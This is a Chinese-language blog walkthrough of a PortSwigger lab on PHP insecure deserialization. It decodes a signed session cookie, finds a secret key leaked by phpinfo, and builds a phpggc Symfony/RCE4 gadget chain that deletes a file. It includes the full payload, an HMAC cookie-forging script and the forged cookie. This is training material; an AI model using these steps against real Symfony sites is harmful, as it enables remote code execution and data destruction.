---
layout: post
title: "PHP deserialization with a pre-built gadget chain"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---






# PHP deserialization with a pre-built gadget chain

```

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`




這個實驗室有一個使用簽名 cookie 的基於序列化的會話機制。 它還使用一個通用的 PHP 框架。 儘管您沒有源代碼訪問權限，但您仍然可以使用預構建的小工具鏈來利用此實驗室的不安全反序列化。

要解決實驗室問題，請確定目標框架，然後使用第三方工俱生成包含遠程代碼執行負載的惡意序列化對象。 然後，研究如何生成包含惡意對象的有效簽名 cookie。 最後，將其傳遞到網站以從 Carlos 的主目錄中刪除morale.txt 文件。

您可以使用以下憑據登錄到您自己的帳戶：wiener:peter


```



我猜這題應該也是你需要知道這個web有沒有使用公開的框架



login -> update email -> 抓包

```http

POST /my-account/change-email HTTP/1.1
Host: 0af5006e044e47c5c0267c7f00c400e9.web-security-academy.net
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%222f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47%22%7D
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0af5006e044e47c5c0267c7f00c400e9.web-security-academy.net
Referer: https://0af5006e044e47c5c0267c7f00c400e9.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333


```


cookie:
```
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%222f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47%22%7D
```

url decode: (看到很多% )應該是
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ==","sig_hmac_sha1":"2f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47"}

```


兩個成員:
1.token
2.sig_hmac_sha1 (這告訴我們這個session 是透過 sha1簽章的)
```
Array
(
    [token] => Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ==

    [sig_hmac_sha1] => 2f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47
)


```



base64 decode token 值:
```

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m10ux78jeotugndvs8zo8jmcfgnb33r5";}


```

反序列一下:
```
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    
    [username] => wiener
    
    [access_token] => m10ux78jeotugndvs8zo8jmcfgnb33r5
)


```


到這邊，我只知道token 的值又是一個序列化的物件。



這題告訴我們要找出框架，這裡使用的是報錯。
把token 改成 token123

```

{"token123":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ==","sig_hmac_sha1":"2f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47"}

```

url encode
```
%7B%22token123%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMTB1eDc4amVvdHVnbmR2czh6bzhqbWNmZ25iMzNyNSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%222f10a8f8536ff1e4c2eb59aeb9eb4dfa4a835d47%22%7D
```


拿去提交出現:

```
#### Internal Server Error: Symfony Version: 4.3.6

PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php on line 7

```
它說Signature does not match session 可能是 數位簽章之類的，也就是說我們sha1的簽章是錯誤的。

要考慮後端有沒有使用密鑰。


上網查一下:
```
Symfony 是一款基於MVC架構的PHP框架
```



此時看一下/cgi-bin/phpinfo.php 在site map 可以看到。

請求一下發現phpinfo.php 被爬出來。看一下

關鍵:
Environment表
```

SECRET_KEY:
fo3dlfrch74g2b9qr17epevnxipap5eg



HTTP_COOKIE:
session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvZDYxNWp5NWo3MXd5cmhlcjZtem9mZGJkYXJhZjQ0MyI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%225d108830ecf0353df2955314504e9dfc9c1f712d%22%7D



PWD:
/home/carlos/cgi-bin


```

都給我們一個cookie範例了。


php有一個函數(上網查 php hmac_sha1 就有)
```

<?php
   echo hash_hmac('md5', 'Welcome to Tutorialspoint', 'any_secretkey');
?>

//output 3e89ca31da24cb046c9d11706be688c1
```

改成
sha1 
加上密鑰
並且驗證一下上面的物件是否使用了密鑰加密。
```php

<?php
   echo hash_hmac('sha1', 'base64(物件)', 'fo3dlfrch74g2b9qr17epevnxipap5eg');
?>

```



url decode
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvZDYxNWp5NWo3MXd5cmhlcjZtem9mZGJkYXJhZjQ0MyI7fQ==","sig_hmac_sha1":"5d108830ecf0353df2955314504e9dfc9c1f712d"}


```



這段base64 如果加上密鑰的結果 =  5d108830ecf0353df2955314504e9dfc9c1f712d
就代表確實使用Environment表上的密鑰
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvZDYxNWp5NWo3MXd5cmhlcjZtem9mZGJkYXJhZjQ0MyI7fQ==

```


果然結果一模一樣，證明了我們可以攻擊了
```

<?php
   echo hash_hmac('sha1', 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvZDYxNWp5NWo3MXd5cmhlcjZtem9mZGJkYXJhZjQ0MyI7fQ==', 'fo3dlfrch74g2b9qr17epevnxipap5eg');
?>

//output 5d108830ecf0353df2955314504e9dfc9c1f712d

```


此時我的靶場超時了，所以SECRET_KEY 也換了
```
SECRET_KEY:
0w7e1g11v7q80itxi90dmbxok2wtas4x

```


phpggc 工具生payload:

1.根據報錯:Symfony Version: 4.3.6
2.之前的phpinfo 也告訴我們了/home/carlos/cgi-bin，換morale.txt

```
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

```


### 這裡有坑~~~
base64 payload:   phpggc產生的是有換行的而且排的很整齊，但就是這裡發生了問題
你必須把base64 in one line 
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6
e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk
ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt
IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g
L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl
XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh
Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj
aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w
b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi
O319Cg==

```


### 兩種方式:

1.手動拼接
```php
<?php 

$object="";

$object .= "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6";
$object .= "e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk";
$object .= "ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt";
$object .= "IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g";
$object .= "L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl";
$object .= "XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh";
$object .= "Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj";
$object .= "aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w";
$object .= "b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi";
$object .= "O319Cg==";

echo ($object);



?>


```

2.方便的 linux 工具兩種
```
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0     


或是用tr 去掉不要的字元
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'  

```

base64 payload:
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

我這題一直失敗，原因就在這，phpggc產出來的base64 是有排整齊的，有包含換行。



cookie.php 生成器:
```
<?php 

$object = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; 

$secretKey = "xxxxxxxxxxxxxxxxxxxxxxx"; 

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); 

echo $cookie;

```

最後替換一下cookie:

```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%22%2C%22sig_hmac_sha1%22%3A%22922e49731c4a820ee274caf5782db73862ccae0d%22%7D
```


拿去提交出現。雖然他說not solved 但你 intercept 關掉，lab 解決了。
```html

HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3423

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Exploiting PHP deserialization with a pre-built gadget chain</title>
    </head>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>Exploiting PHP deserialization with a pre-built gadget chain</h2>
                    <a id='lab-link' class='button' href='/'>Back to lab home</a>
                    <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-notsolved'>
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
</div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error: Symfony Version: 4.3.6</h4>
                    <p class=is-warning>PHP Fatal error:  Uncaught Error: Call to a member function saveDeferred() on null in /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php:225
Stack trace:
#0 /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php(191): Symfony\Component\Cache\Adapter\ProxyAdapter-&gt;doSave(Array, &apos;saveDeferred&apos;)
#1 /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php(125): Symfony\Component\Cache\Adapter\ProxyAdapter-&gt;saveDeferred(Object(Symfony\Component\Cache\CacheItem))
#2 /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php(286): Symfony\Component\Cache\Adapter\TagAwareAdapter-&gt;invalidateTags(Array)
#3 /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php(291): Symfony\Component\Cache\Adapter\TagAwareAdapter-&gt;commit()
#4 [internal function]: Symfony\Compo in /usr/local/envs/php-symfony-4.3.6/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php on line 225</p>
                </div>
            </section>
        </div>
    </body>
</html>


```


成功。




這題找到了secret key 導致竄改的物件，可以被sha1 加密驗證 完成攻擊。